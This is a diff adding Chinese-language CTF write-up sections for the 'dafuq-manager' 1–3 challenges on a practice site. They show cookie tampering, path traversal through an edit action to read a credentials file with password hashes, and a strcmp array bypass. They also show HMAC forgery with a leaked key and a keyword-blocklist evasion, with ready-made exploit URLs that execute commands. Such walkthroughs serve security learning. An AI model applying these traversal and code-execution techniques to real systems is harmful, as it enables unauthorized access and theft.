@@ -296,3 +296,437 @@ data={"users":{"admin":"admin"},"username":"admin","password":"admin"}
 
 ## 26: dafuq-manager 1
 
+查看 `cookie`，发现有个 `show_hidden` 参数。改成 `yes` 之后可以看到隐藏的两个文件。`flag` 就在其中。
+
+## 27: dafuq-manager 2
+
+第二个隐藏文件提示：
+
+```
+Try to login as admin! and you will get flag2
+```
+
+所以需要我们去看这个 manager 的源代码了，下载源代码，开始审计，重点关注与 `admin` 有关的部分。
+
+在 `index.php` 中：
+
+```php
+case "admin":
+	require "./core/fun_admin.php";
+	show_admin($GLOBALS["dir"]);
+break;
+```
+
+尝试访问 `https://dafuq-manager.hackme.inndy.tw/index.php?action=admin`，得到：
+
+```
+#0  show_error(You are not allowed to use this function.) called at [/var/www/webhdisk/core/fun_admin.php:218]
+#1  show_admin() called at [/var/www/webhdisk/index.php:72]
+```
+
+提示权限不足。下面关注 `fun_admin.php`。
+
+`show_admin()` 内容如下：
+
+```php
+function show_admin($dir) {
+    $pwd = (($GLOBALS["permissions"] & 2) == 2);
+    $admin = (($GLOBALS["permissions"] & 4) == 4);
+    if (!$GLOBALS["require_login"]) show_error($GLOBALS["error_msg"]["miscnofunc"]);
+    if (isset($GLOBALS['__GET']["action2"])) $action2 = $GLOBALS['__GET']["action2"];
+    elseif (isset($GLOBALS['__POST']["action2"])) $action2 = $GLOBALS['__POST']["action2"];
+    else $action2 = "";
+    switch ($action2) {
+        case "chpwd":
+            if (!$pwd) show_error($GLOBALS["error_msg"]["accessfunc"]);
+            changepwd($dir);
+            break;
+        case "adduser":
+            if (!$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
+            adduser($dir);
+            break;
+        case "edituser":
+            if (!$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
+            edituser($dir);
+            break;
+        case "rmuser":
+            if (!$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
+            removeuser($dir);
+            break;
+        default:
+            if (!$pwd && !$admin) show_error($GLOBALS["error_msg"]["accessfunc"]);
+            admin($admin, $dir);
+        }
+    }
+```
+
+要成为 admin，需要满足：
+
+```php
+$pwd = (($GLOBALS["permissions"] & 2) == 2);
+$admin = (($GLOBALS["permissions"] & 4) == 4);
+```
+
+全局搜索 `permissions`，发现赋值在 `fun_users.php`。
+
+```php
+function activate_user($user, $pass) {
+    $data = find_user($user, $pass);
+    if ($data == NULL) return false;
+    $GLOBALS['__SESSION']["s_user"] = $data[0];
+    $GLOBALS['__SESSION']["s_pass"] = $data[1];
+    $GLOBALS["home_dir"] = $data[2];
+    $GLOBALS["home_url"] = $data[3];
+    $GLOBALS["show_hidden"] = $data[4];
+    $GLOBALS["no_access"] = $data[5];
+    $GLOBALS["permissions"] = $data[6];
+    return true;
+}
+```
+
+变量 `$data` 在 `find_user()` 中。
+
+```php
+function &find_user($user, $pass) {
+    $cnt = count($GLOBALS["users"]);
+    for ($i = 0;$i < $cnt;++$i) {
+        if ($user == $GLOBALS["users"][$i][0]) {
+            if ($pass == NULL || ($pass == $GLOBALS["users"][$i][1] && $GLOBALS["users"][$i][7])) {
+                return $GLOBALS["users"][$i];
+            }
+        }
+    }
+    return NULL;
+}
+```
+
+而 `$GLOBALS["users"]` 在哪里呢？全局搜索，发现在 `.htusers.php` 中：
+
+```php
+<?php
+$GLOBALS["users"] = array(
+    array("guest", "084e0343a0486ff05530df6c705c8bb4", "./data/guest", "https://game1.security.ntu.st/data/guest", 0, "^.ht", 1, 1),
+);
+
+```
+
+所以我们是否能够尝试读取服务器上的 `.htusers.php`？直接访问 `https://dafuq-manager.hackme.inndy.tw/.config/.htusers.php` 肯定是没办法看到变量内容的。
+
+先看看能不能用 `download` 下载。在 `index.php` 中：
+
+```php
+case "download":
+	ob_start(); // prevent unwanted output
+	require "./core/fun_down.php";
+	ob_end_clean(); // get rid of cached unwanted output
+	download_item($GLOBALS["dir"], $GLOBALS["item"]);
+	ob_start(false); // prevent unwanted output
+	exit;
+break;
+```
+
+`fun_down.php` 内容如下：
+
+```php
+<?php
+require_once ('core/secure.php');
+function download_item($dir, $item) {
+    $item = basename($item);
+    if (($GLOBALS["permissions"] & 01) != 01) show_error($GLOBALS["error_msg"]["accessfunc"]);
+    if (!get_is_file($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["fileexist"]);
+    if (!get_show_item($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
+    $abs_item = get_abs_item($dir, $item);
+    if (!file_in_web($abs_item) || stristr($abs_item, '.php') || stristr($abs_item, 'config')) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
+    $browser = id_browser();
+    header('Content-Type: ' . (($browser == 'IE' || $browser == 'OPERA') ? 'application/octetstream' : 'application/octet-stream'));
+    header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');
+    header('Content-Transfer-Encoding: binary');
+    header('Content-Length: ' . filesize($abs_item));
+    if ($browser == 'IE') {
+        header('Content-Disposition: attachment; filename="' . $item . '"');
+        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+        header('Pragma: public');
+    } else {
+        header('Content-Disposition: attachment; filename="' . $item . '"');
+        header('Cache-Control: no-cache, must-revalidate');
+        header('Pragma: no-cache');
+    }
+    @readfile($abs_item);
+    exit;
+}
+```
+
+已知 `guest` 的 `permissions` 为 1，所以用户方面没有什么问题。如果直接尝试下载：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=download&item=../../.config/.htusers.php&order=name&srt=yes&lang=cht
+```
+
+会报错：
+
+```
+#0  show_error(.htusers.php: 檔案不存在。) called at [/var/www/webhdisk/core/fun_down.php:6]
+#1  download_item(, .htusers.php) called at [/var/www/webhdisk/index.php:34]
+```
+
+注意到我们跳出目录的尝试直接被过滤了。全局搜索 `$GLOBALS["item"]`，发现在 `init.php` 中：
+
+```php
+if (isset($GLOBALS['__GET']["item"])) $GLOBALS["item"] = stripslashes($GLOBALS['__GET']["item"]);
+else $GLOBALS["item"] = "";
+```
+
+但 `stripslashes()` 不会影响我们。回头再去 `fun_down.php`，发现第 4 行：
+
+```php
+$item = basename($item);
+```
+
+过滤了我们的 `../`。
+
+那么看看另一个功能 `edit`。下面是 `fun_edit.php` 中 `edit_file()` 函数的一部分。
+
+```php
+function edit_file($dir, $item) {
+    if (($GLOBALS["permissions"] & 01) != 01) show_error($GLOBALS["error_msg"]["accessfunc"]);
+    if (!get_is_file($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["fileexist"]);
+    if (!get_show_item($dir, $item)) show_error($item . ": " . $GLOBALS["error_msg"]["accessfile"]);
+    $fname = get_abs_item($dir, $item);
+    if (!file_in_web($fname)) show_error($GLOBALS["error_msg"]["accessfile"]);
+    if (isset($GLOBALS['__POST']["dosave"]) && $GLOBALS['__POST']["dosave"] == "yes") {
+        $item = basename(stripslashes($GLOBALS['__POST']["fname"]));
+        $fname2 = get_abs_item($dir, $item);
+        if (!isset($item) || $item == "") show_error($GLOBALS["error_msg"]["miscnoname"]);
+        if ($fname != $fname2 && @file_exists($fname2)) show_error($item . ": " . $GLOBALS["error_msg"]["itemdoesexist"]);
+        savefile($dir, $fname2);
+        $fname = $fname2;
+    }
+    $fp = @fopen($fname, "r");
+    if ($fp === false) show_error($item . ": " . $GLOBALS["error_msg"]["openfile"]);
+    $s_item = get_rel_item($dir, $item);
+    if (strlen($s_item) > 50) $s_item = "..." . substr($s_item, -47);
+    show_header($GLOBALS["messages"]["actedit"] . ": /" . $s_item); ?><script language="JavaScript1.2" type="text/javascript">
+<!--
+```
+
+没有 `basename()`。
+
+所以尝试以下：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=edit&item=../../.config/.htusers.php&order=name&srt=yes&lang=cht
+```
+
+成功！
+
+文件内容：
+
+```php
+<?php
+$GLOBALS["users"] = array(
+    array("adm1n15trat0r", "34af0d074b17f44d1bb939765b02776f", "./data", "https://dafuq-manager.hackme.inndy.tw/data", 1, "^.ht", 7, 1),
+    array("inndy", "fc5e038d38a57032085441e7fe7010b0", "./data/inndy", "https://dafuq-manager.hackme.inndy.tw/data/inndy", 0, "^.ht", 1, 1),
+    array("guest", "084e0343a0486ff05530df6c705c8bb4", "./data/guest", "https://dafuq-manager.hackme.inndy.tw/data/guest", 0, "^.ht", 1, 1),
+);
+
+```
+
+管理员密码 hash 为 `34af0d074b17f44d1bb939765b02776f`，拖到 http://www.cmd5.com/ 看看，发现要付费，之后一番波折，解密出了密码为 `how do you turn this on`。
+
+登录就能看到 flag 了。
+
+## 28: dafuq-manager 3
+
+要求 get a shell。但要代码执行的话……我们上传个文件试试？但是失败了，再弄弄就发现这个网站似乎是只读的。（想想也是，不然到今天题目就没法做了）
+
+在 `index.php` 中有一个奇怪的功能 `debug`，尝试：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht
+```
+
+返回错误：
+
+```
+#0  show_error(You are not hacky enough :() called at [/var/www/webhdisk/core/fun_debug.php:10]
+#1  do_debug() called at [/var/www/webhdisk/index.php:76]
+```
+
+`You are not hacky enough :(`？看来这里可能就是突破口。
+
+`fun_debug.php` 内容如下：
+
+```php
+<?php
+function make_command($cmd) {
+    $hmac = hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]);
+    return sprintf('%s.%s', base64_encode($cmd), $hmac);
+}
+function do_debug() {
+    assert(strlen($GLOBALS['secret_key']) > 40);
+    $dir = $GLOBALS['__GET']['dir'];
+    if (strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")) {
+        show_error('You are not hacky enough :(');
+    }
+    list($cmd, $hmac) = explode('.', $GLOBALS['__GET']['command'], 2);
+    $cmd = base64_decode($cmd);
+    $bad_things = array('system', 'exec', 'popen', 'pcntl_exec', 'proc_open', 'passthru', '`', 'eval', 'assert', 'preg_replace', 'create_function', 'include', 'require', 'curl',);
+    foreach ($bad_things as $bad) {
+        if (stristr($cmd, $bad)) {
+            die('2bad');
+        }
+    }
+    if (hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)) {
+        die(eval($cmd));
+    } else {
+        show_error('What does the fox say?');
+    }
+}
+```
+
+似乎可以执行命令。现在看来首先要让 `strcmp($dir, "magically") || strcmp($dir, "hacker") || strcmp($dir, "admin")` 不成立。但是 `strcmp()` 的参数如果是数组，那么就会有惊喜。
+
+尝试：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a
+```
+
+返回错误：
+
+```
+#0  show_error(What does the fox say?) called at [/var/www/webhdisk/core/fun_debug.php:23]
+#1  do_debug() called at [/var/www/webhdisk/index.php:76]
+```
+
+What does the fox say? ~~大楚兴，陈胜王~~
+
+好了不开玩笑了，现在我们需要让 `hash_equals(hash_hmac('sha256', $cmd, $GLOBALS["secret_key"]), $hmac)` 满足。
+
+首先 `$GLOBALS["secret_key"]` 在哪里？全局查找就能找到了：
+
+```php
+$GLOBALS["secret_key"] = 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3';
+```
+
+将 `make_command()` 修改为：
+
+```php
+function make_command($cmd) {
+    $hmac = hash_hmac('sha256', $cmd, 'KHomg4WfVeJNj9q5HFcWr5kc8XzE4PyzB8brEw6pQQyzmIZuRBbwDU7UE6jYjPm3');
+    return sprintf('%s.%s', base64_encode($cmd), $hmac);
+}
+```
+
+开 `php -a`，把这个函数拖进去。然后试试：
+
+```
+php > echo make_command("phpinfo();");
+cGhwaW5mbygpOw==.5f043639d3ab2a90ecff68818494100d54b98e737ca72fe927b9b5e365e59eb4
+```
+
+`urlencode` 之后 `GET` 一下：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=cGhwaW5mbygpOw%3D%3D.5f043639d3ab2a90ecff68818494100d54b98e737ca72fe927b9b5e365e59eb4
+```
+
+成功！我们执行了 `phpinfo()`。
+
+接下来就是看 flag 文件的时候了。尽管有过滤，但这一类直接搜索字符串的过滤都是纸老虎。~~作为世界上最好的语言，~~PHP 有很多你想象不到的技巧。
+
+```
+php > echo make_command('$v1=\'sys\';$v2=\'tem\';$v3=$v1.$v2;$v3(\'ls\');');
+JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJ2xzJyk7.320ae7d860c0e68ff17aad5ce0d72208bcf6a2999b7ba8f1592d34fe5f7bbff4
+```
+
+（PHP 内单、双引号有区别，需要注意）
+
+然后：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJ2xzJyk7.320ae7d860c0e68ff17aad5ce0d72208bcf6a2999b7ba8f1592d34fe5f7bbff4
+```
+
+返回：
+
+```
+core data flag3 img index.php lang lib style
+```
+
+成功！`flag3` 似乎近在眼前。
+
+但是尝试运行 `cat flag3`：
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJ2NhdCBmbGFnMycpOw%3D%3D.dc6aaa6fe380828fab4665574c17d71d36882e0ffcd1287f9da416581bb30292
+```
+
+却什么都没有返回。
+
+难道 `flag3` 是个目录？执行 `ls -l flag3`，果然：
+
+```shell
+total 24
+-rw-r--r-- 1 root  root   161 Oct  4  2016 Makefile
+-r-------- 1 flag3 flag3   72 Oct  4  2016 flag3
+-rws--s--x 1 flag3 flag3 9232 Oct  4  2016 meow
+-rw-r--r-- 1 root  root   783 Oct  4  2016 meow.c
+```
+
+`cat flag3/meow.c`：
+
+```c
+#include <stdio.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main(int argc, char *argv[])
+{
+	const char *exec = argv[0];
+	const char *flag = argv[1];
+	char buffer[4096];
+
+	if(argc < 2) {
+		printf("Usage: %s flag\n", argv[0]);
+		puts("We have cat to read file, And the meow to cat flag.");
+		return 0;
+	}
+
+	struct stat S;
+	if(stat(exec, &S) != 0) {
+		printf("Can not stat file %s\n", exec);
+		return 1;
+	}
+
+	uid_t uid = S.st_uid;
+	gid_t gid = S.st_gid;
+
+	setuid(uid);
+	seteuid(uid);
+	setgid(gid);
+	setegid(gid);
+
+	int fd = open(flag, O_RDONLY);
+	if(fd == -1) {
+		printf("Can not open file %s\n", flag);
+		return 2;
+	}
+	ssize_t readed = read(fd, buffer, sizeof(buffer) - 1);
+	if(readed > 0) {
+		write(1, buffer, readed);
+	}
+	close(fd);
+}
+```
+
+那就用这个程序去读 flag 了。
+
+```
+https://dafuq-manager.hackme.inndy.tw/index.php?action=debug&order=name&srt=yes&lang=cht&dir[]=a&command=JHYxPSdzeXMnOyR2Mj0ndGVtJzskdjM9JHYxLiR2MjskdjMoJy4vZmxhZzMvbWVvdyBmbGFnMy9mbGFnMycpOw%3D%3D.2619d41150bac3f1bcf1e059966be08e85aaa573e144d9223c53cc4d765cf8f8
+```
+
+got it!
+
